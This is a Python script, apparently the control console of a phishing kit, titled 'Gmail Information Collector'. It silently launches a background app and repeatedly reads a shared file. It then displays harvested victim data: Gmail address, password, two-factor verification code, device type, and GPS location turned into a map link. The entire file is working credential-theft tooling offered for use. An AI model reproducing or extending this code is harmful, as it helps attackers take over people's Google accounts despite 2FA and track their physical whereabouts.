import subprocess
import time
import json
import os
from colorama import init, Fore, Style
from datetime import datetime

# Initialize colorama
init()

def print_banner():
    print(f"{Fore.CYAN}=" * 50)
    print(f"{Fore.YELLOW}Gmail Information Collector{Style.RESET_ALL}")
    print(f"{Fore.CYAN}=" * 50 + Style.RESET_ALL)

def clear_old_data():
    # حذف الملف القديم إذا كان موجوداً
    if os.path.exists('collected_data/shared_data.json'):
        os.remove('collected_data/shared_data.json')

def read_shared_data():
    try:
        with open('collected_data/shared_data.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return None

def print_info(data):
    if not data:
        return

    # Print all available information
    print(f"\n{Fore.GREEN}[+] Collected Information:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}")
    
    # Credentials section
    if 'credentials' in data:
        creds = data['credentials']
        if creds.get('email'):
            print(f"{Fore.YELLOW}Email:{Style.RESET_ALL} {creds['email']}")
        if creds.get('password1'):
            print(f"{Fore.YELLOW}Password:{Style.RESET_ALL} {creds['password1']}")
        if creds.get('verification_code'):
            print(f"{Fore.YELLOW}2FA Code:{Style.RESET_ALL} {creds['verification_code']}")
        if creds.get('device_type'):
            print(f"{Fore.YELLOW}Device:{Style.RESET_ALL} {creds['device_type']}")

    # Location section
    if 'location' in data:
        loc = data['location']
        if 'latitude' in loc and 'longitude' in loc:
            maps_url = f"https://www.google.com/maps?q={loc['latitude']},{loc['longitude']}"
            print(f"{Fore.YELLOW}Location:{Style.RESET_ALL} {maps_url}")
    
    print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}")

def monitor_data():
    print_banner()
    
    # Clear old data before starting
    clear_old_data()
    
    # Start minimal_app.py in background without showing its output
    with open(os.devnull, 'w') as devnull:
        minimal_process = subprocess.Popen(
            ['python', 'dontouch/minimal_app.py'],
            stdout=devnull,
            stderr=devnull
        )
    
    print(f"{Fore.GREEN}[*] Waiting for data collection...{Style.RESET_ALL}")
    
    start_time = datetime.now()
    last_data = None
    
    try:
        while True:
            data = read_shared_data()
            if data:
                current_data = json.dumps(data, sort_keys=True)
                
                # Check if we have new data
                if current_data != last_data:
                    # Verify the data is from current session
                    if 'last_update' in data:
                        update_time = datetime.fromisoformat(data['last_update'])
                        if update_time > start_time:
                            print_info(data)
                            last_data = current_data
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Stopping collector...{Style.RESET_ALL}")
        minimal_process.terminate()
        minimal_process.wait()

def main():
    try:
        monitor_data()
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    main() 